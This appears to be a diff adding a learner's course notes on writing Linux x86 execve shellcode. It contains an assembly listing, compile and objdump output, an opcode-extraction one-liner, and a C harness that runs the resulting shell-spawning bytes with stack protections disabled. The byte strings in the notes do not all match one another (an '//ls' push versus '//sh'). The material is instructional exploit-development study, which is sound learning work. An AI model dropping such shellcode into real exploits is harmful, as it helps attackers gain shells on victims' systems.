@@ -5349,3 +5349,112 @@ $ ps
 
 Execve Shellcode Stack Method:
 
+./reverse.py "////bin/bash"
+String length : 12
+hsab : 68736162
+/nib : 2f6e6962
+//// : 2f2f2f2f
+
+vim execve.nasm
+
+; Filename: execve.nasm
+; Author:  Vivek Ramachandran
+; Website:  http://securitytube.net
+; Training: http://securitytube-training.com
+;
+;
+; Purpose:
+
+global _start
+
+section .text
+_start:
+
+        jmp short call_shellcode
+
+
+shellcode:
+
+        pop esi
+
+        xor ebx, ebx
+        mov byte [esi +7], bl
+        mov dword [esi +8], esi
+        mov dword [esi +12], ebx
+
+
+        lea ebx, [esi]
+
+        lea ecx, [esi +8]
+
+        lea edx, [esi +12]
+
+        xor eax, eax
+        mov al, 0xb
+        int 0x80
+
+
+
+call_shellcode:
+
+        call shellcode
+        message db "/bin/shABBBBCCCC"
+	
+./compile.sh execve-stack
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Done!
+./execve-stack 
+compile.sh  execve-stack       execve-stack.o  execve.o    shellcode
+execve	    execve-stack.nasm  execve.nasm     reverse.py  shellcode.c
+$ ps
+  PID TTY          TIME CMD
+13390 pts/0    00:00:00 bash
+23037 pts/0    00:00:00 ps
+
+objdump -d ./execve-stack -M intel
+
+./execve-stack:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048080 <_start>:
+ 8048080:	31 c0                	xor    eax,eax
+ 8048082:	50                   	push   eax
+ 8048083:	68 2f 2f 6c 73       	push   0x736c2f2f
+ 8048088:	68 2f 62 69 6e       	push   0x6e69622f
+ 804808d:	89 e3                	mov    ebx,esp
+ 804808f:	50                   	push   eax
+ 8048090:	89 e2                	mov    edx,esp
+ 8048092:	53                   	push   ebx
+ 8048093:	89 e1                	mov    ecx,esp
+ 8048095:	b0 0b                	mov    al,0xb
+ 8048097:	cd 80                	int    0x80
+ 
+objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+vim shellcode.c
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+main()
+{
+
+        printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+
+gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+./shellcode 
+Shellcode Length:  25
+
+Video 28:
